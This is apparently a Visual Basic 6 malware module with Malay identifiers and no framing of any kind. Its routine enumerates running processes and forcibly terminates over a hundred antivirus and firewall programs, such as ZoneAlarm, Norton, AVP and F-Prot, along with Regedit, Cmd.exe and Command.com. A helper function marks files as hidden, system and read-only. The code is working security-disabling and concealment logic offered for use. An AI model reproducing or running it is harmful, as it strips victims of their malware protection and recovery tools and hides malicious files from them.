Attribute VB_Name = "mdAXAM"
Option Explicit
Public Const MAX_PATH As Integer = 260
Public Const TH32CS_SNAPPROCESS = &H2
Public Const PROCESS_TERMINATE = &H1
Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
     th32ProcessID As Long
     th32DefaultHeapID As Long
     th32ModuleID As Long
     cntThreads As Long
     th32ParentProcessID As Long
     pcPriClassBase As Long
     dwFlags As Long
     szExeFile As String * MAX_PATH
End Type
Private Declare Function GetShortPathName Lib "KERNEL32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Public Declare Function CreateToolhelpSnapshot Lib "KERNEL32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, ByVal lProcessID As Long) As Long
Public Declare Function ProcessFirst Lib "KERNEL32" Alias "Process32First" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Public Declare Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function GetExitCodeProcess Lib "KERNEL32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Public Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Public Declare Function ProcessNext Lib "KERNEL32" Alias "Process32Next" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Public Declare Function CloseHandle Lib "KERNEL32" (ByVal hFile As Long) As Long
Dim cPathRemoveFile As String
Global xAnswer As Variant

Public Sub SearchFirewall()
On Error Resume Next
KillApp "Zonealarm.exe"
KillApp "Wfindv32.exe"
KillApp "Webscanx.exe"
KillApp "Vsstat.exe"
KillApp "Vshwin32.exe"
KillApp "Vsecomr.exe"
KillApp "Vscan40.exe"
KillApp "Vettray.exe"
KillApp "Vet95.exe"
KillApp "VControl.exe"
KillApp "Tds2-Nt.exe"
KillApp "Tds2-98.exe"
KillApp "Tca.exe"
KillApp "Tbscan.exe"
KillApp "Sweep95.exe"
KillApp "Sphinx.exe"
KillApp "Smc.exe"
KillApp "Serv95.exe"
KillApp "Scrscan.exe"
KillApp "Scanpm.exe"
KillApp "Scan95.exe"
KillApp "Scan32.exe"
KillApp "Safeweb.exe"
KillApp "Rescue.exe"
KillApp "Regedit.exe"
KillApp "Regedit.com"
KillApp "Rav7win.exe"
KillApp "Rav7.exe"
KillApp "Persfw.exe"
KillApp "Pcfwallicon.exe"
KillApp "Pccwin98.exe"
KillApp "Pavw.exe"
KillApp "Pavsched.exe"
KillApp "Pavcl.exe"
KillApp "Padmin.exe"
KillApp "Outpost.exe"
KillApp "Nvc95.exe"
KillApp "Nupgrade.exe"
KillApp "Normist.exe"
KillApp "Nmain.exe"
KillApp "Nisum.exe"
KillApp "Navwnt.exe"
KillApp "Navw32.exe"
KillApp "Navnt.exe"
KillApp "Navlu32.exe"
KillApp "Navapw32.exe"
KillApp "N32scanw.exe"
KillApp "Mpftray.exe"
KillApp "Moolive.exe"
KillApp "Luall.exe"
KillApp "Lookout.exe"
KillApp "Lockdown2000.exe"
KillApp "Jedi.exe"
KillApp "Iomon98.exe"
KillApp "Iface.exe"
KillApp "Icsuppnt.exe"
KillApp "Icsupp95.exe"
KillApp "Icmon.exe"
KillApp "Icloadnt.exe"
KillApp "Icload95.exe"
KillApp "Ibmavsp.exe"
KillApp "Ibmasn.exe"
KillApp "Iamserv.exe"
KillApp "Iamapp.exe"
KillApp "HH.exe"
KillApp "Frw.exe"
KillApp "Fprot.exe"
KillApp "Fp-Win.exe"
KillApp "Findviru.exe"
KillApp "F-Stopw.exe"
KillApp "F-Prot95.exe"
KillApp "F-Prot.exe"
KillApp "F-Agnt95.exe"
KillApp "Espwatch.exe"
KillApp "Esafe.exe"
KillApp "Ecengine.exe"
KillApp "Dvp95_0.exe"
KillApp "Dvp95.exe"
KillApp "Command.com"
KillApp "Cmd.exe"
KillApp "Cleaner3.exe"
KillApp "Cleaner.exe"
KillApp "Claw95cf.exe"
KillApp "Claw95.exe"
KillApp "Cfinet32.exe"
KillApp "Cfinet.exe"
KillApp "Cfiaudit.exe"
KillApp "Cfiadmin.exe"
KillApp "ccApp.exe"
KillApp "Blackice.exe"
KillApp "Blackd.exe"
KillApp "Avwupd32.exe"
KillApp "Avwin95.exe"
KillApp "Avsched32.exe"
KillApp "Avpupd.exe"
KillApp "Avptc32.exe"
KillApp "Avpm.exe"
KillApp "Avpdos32.exe"
KillApp "Avpcc.exe"
KillApp "Avp32.exe"
KillApp "Avp.exe"
KillApp "Avnt.exe"
KillApp "Avkserv.exe"
KillApp "Avgctrl.exe"
KillApp "Ave32.exe"
KillApp "Avconsol.exe"
KillApp "Autodown.exe"
KillApp "Apvxdwin.exe"
KillApp "Anti-Trojan.exe"
KillApp "Ackwin32.exe"
KillApp "_Avpm.exe"
KillApp "_Avpcc.exe"
KillApp "_Avp32.exe"

End Sub

Public Sub KillApp(cProgram As String)
   Dim hSnapShot As Long
   Dim uProcess As PROCESSENTRY32
   Dim rProcess As Long
   Dim tPID As Long
   Dim tMID As Long
   Dim lExitCode As Long
   Dim hProcess As Long
   Dim cProcess As String
   cPathRemoveFile = ""
   cProgram = UCase$(cProgram)
   hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
   If hSnapShot <> 0 Then
      uProcess.dwSize = Len(uProcess)
      rProcess = ProcessFirst(hSnapShot, uProcess)
      Do While rProcess
         tPID = uProcess.th32ProcessID
         tMID = uProcess.th32ModuleID
         cPathRemoveFile = RemoveChr0(uProcess.szExeFile)
         If cPathRemoveFile <> "" And UCase$(Right$(cPathRemoveFile, Len(cProgram))) = cProgram Then
            While cPathRemoveFile <> "" And Right$(cPathRemoveFile, 1) <> "\"
               cPathRemoveFile = Left$(cPathRemoveFile, Len(cPathRemoveFile) - 1)
            Wend
            hProcess = OpenProcess(PROCESS_TERMINATE, CLng(False), CLng(uProcess.th32ProcessID))
            If hProcess <> 0 Then
               If GetExitCodeProcess(hProcess, lExitCode) <> 0 Then
                  xAnswer = TerminateProcess(hProcess, lExitCode)
               End If
            End If
         End If
         rProcess = ProcessNext(hSnapShot, uProcess)
      Loop
      Call CloseHandle(hSnapShot)
   End If
End Sub

Public Function RemoveChr0(cString As String)
   While Right(cString, 1) = Chr$(0)
      cString = Left(cString, Len(cString) - 1)
   Wend
   RemoveChr0 = cString
End Function

Function Mesej(Ayat As String, Ikon As Integer, Tajuk As String)
MsgBox Ayat, Ikon, Tajuk
End Function

Function Atribut(NamaFail As String)
SetAttr NamaFail, vbHidden + vbSystem + vbReadOnly
End Function
